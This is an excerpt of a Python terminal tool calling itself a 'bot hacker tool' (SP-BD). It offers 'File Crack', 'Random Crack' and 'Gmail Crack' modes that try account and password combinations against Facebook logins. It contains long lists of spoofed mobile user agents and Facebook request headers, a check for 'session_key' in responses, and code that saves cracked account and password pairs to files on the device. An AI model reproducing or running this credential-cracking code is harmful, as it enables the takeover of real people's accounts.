...
print("\033[1;92m [•] SP-BD (ROBOT) SYSTEM INSTALL. . . . \033[1;30m")
...
os.system('espeak -a 300 "CREATE BY WASIM 360"')
...
os.system('espeak -a 300 "Subscribe my telegram channel1111"')
...
"""
Mozilla/5.0 (Linux; U; Android 18; zh-CN; MZ-meizu 17 Bui ld/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.7.6 787.(756 MZBrowser/9.14.1 Mobile Safari/537.3654 Build/PJM63L) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/25.0.5644.80 Mobile Safari/537.36 HeyTapBrowser/33.7.36.1

Mozilla/5.0 (Linux; U; Android 18; zh-CN; MZ-meizu 17 Bui ld/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.7.6 787.(756 MZBrowser/9.14.1 Mobile Safari/537.3656 Build/SLQ99W) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.5417.80 Mobile Safari/537.36 HeyTapBrowser/19.7.36.1

Mozilla/5.0 (Linux; U; Android 18; zh-CN; MZ-meizu 17 Bui ld/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.7.6 787.(756 MZBrowser/9.14.1 Mobile Safari/537.3650 Build/GLV27W) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.0.8194.80 Mobile Safari/537.36 HeyTapBrowser/36.7.36.1

Mozilla/5.0 (Linux; U; Android 18; zh-CN; MZ-meizu 17 Bui ld/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.7.6 787.(756 MZBrowser/9.14.1 Mobile Safari/537.3634 Build/MXW68N) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/24.0.5407.80 Mobile Safari/537.36 HeyTapBrowser/2.7.36.1

Mozilla/5.0 (Linux; U; Android 18; zh-CN; MZ-meizu 17 Bui ld/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.7.6 787.(756 MZBrowser/9.14.1 Mobile Safari/537.3641 Build/LEE43U) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.4710.80 Mobile Safari/537.36 HeyTapBrowser/6.7.36.1

Mozilla/5.0 (Linux; U; Android 18; zh-CN; MZ-meizu 17 Bui ld/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.7.6 787.(756 MZBrowser/9.14.1 Mobile Safari/537.3638 Build/QTV69N) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/32.0.2767.80 Mobile Safari/537.36 HeyTapBrowser/9.7.36.1

Mozilla/5.0 (Linux; Android 11; M2101K6G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.128 Mobile Safari/537.36 OPR/73.0.3844.69640","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8
...
os.system('espeak -a 300 "Welcome bot hacker tool"')
logo= f'''
...
\033[1;97m Owner  : 𒆜 𝐖 𝐀 𝐒 𝐈 𝐌 𒆜

\033[1;97m GitHub : wasimmoulik008

\033[1;97m Version:\033[1;92m 0.2 \033[1;97m:/

\033[1;97m YouTub: 𝐖𝐀𝐒𝐈𝐌 𝟑𝟔𝟎

\033[1;97m Team : 𒆜 𝙏𝙀𝘼𝙈 𝘽𝙊𝙏 𝙃𝘼𝘾𝙆𝙀𝙍 𒆜

\033[1;97m Notice : Use Flight For More OK Ids
...
def Axi_Main():
    ...
    os.system('espeak -a 300 "Tools Admin WASIM File Crack Pak Random Crack Gmail Crack.     Create Dump File"')
 
    print(logo) 
    
   
    print(f"\033[1;93m{oo(1)}File Crack")

    print(f"\033[1;93m{oo(2)}Pak Random Crack")

    print(f"\033[1;93m{oo(3)}Gmail Crack")  

    print(f"\033[1;93m{oo(4)}Create Dump File")

    print(f"\033[1;93m{oo(0)}Exit Menu")
...
def check(session,coki):
    ...
    if len(game)==0:
        ...
        for gm in game:
            ...
            print(f"\033[1;97m---\033[1;96m"+gm.replace('huwtn',' Axi-code=Ahsan-33'))
    ...
    if len(game)==0:
        ...
        for gm in game:
            ...
            print(f"\033[1;97m---\033[1;93m"+gm.replace('riJan','Axi-182^)Code=Ahsan-2233]'))
...
def gmail():     
        ...
        for xd in range(int(limit)):
            ...
            if '3' in lchoice:
                ...
                open('.Ahsan','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
            ...
            fo = open('.Ahsan', 'r').read().splitlines()
...
Mozilla/5.0 (Linux; Android 11; TECNO KD8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4755.101 Mobile Safari/537.36;]
...
Mozilla/5.0 (Linux; U; Android 18; zh-CN; MZ-meizu 17 Bui ld/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.7.6 787.(756 MZBrowser/9.14.1 Mobile Safari/537.3637 Build/ZCV14A) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.6950.80 Mobile Safari/537.36 HeyTapBrowser/20.7.36.1;]

Mozilla/5.0 (Linux; U; Android 18; zh-CN; MZ-meizu 17 Bui ld/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.7.6 787.(756 MZBrowser/9.14.1 Mobile Safari/537.3634 Build/YAT15J) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.8569.80 Mobile Safari/537.36 HeyTapBrowser/24.7.36.1;]

Mozilla/5.0 (Linux; U; Android 18; zh-CN; MZ-meizu 17 Bui ld/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.7.6 787.(756 MZBrowser/9.14.1 Mobile Safari/537.3651 Build/JES77M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/23.0.8556.80 Mobile Safari/537.36 HeyTapBrowser/34.7.36.1;]

Mozilla/5.0 (Linux; U; Android 18; zh-CN; MZ-meizu 17 Bui ld/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.7.6 787.(756 MZBrowser/9.14.1 Mobile Safari/537.3643 Build/KQP21K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.7240.80 Mobile Safari/537.36 HeyTapBrowser/3.7.36.1;]
...
Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]
...
def method():
    ...
    print(f"{oo('•')}/sdcard/SP-BD-OK.txt")
    ...
    def start(user):
     ...
     try:
        ...
        sys.stdout.write('\r\033[1;91m[\033[1;97mSP-BD◼️\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}       \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
      ...
      #      print(response.text)
            ...
            if 'session_key' in response.text:
                ...
                print('\r\033[1;92m[\033[1;97mSP🔓-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')

                open('/sdcard/SP-BD-OK.txt','a').write(f'{acc} • {pword}\n')
                ...
                if cpok=='n':
                     ...
                     print('\r\033[1;91m[\033[1;97mSP-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword+'   ')

                cpacc.append(acc)

                open('/sdcard/SP-BD-CP.txt','a').write(f'{acc} • {pword}\n')
...
def andom():
    ...
    def start(user):
     ...
     try:
        ...
        sys.stdout.write('\r\033[1;91m[\033[1;97mSP-BD\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}       \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
  ...
  #      print(response.text)
    ...
    def start2(user):
      ...
      try:
        ...
        sys.stdout.write('\r\033[1;91m[\033[1;97mAxi-M2\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}      \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
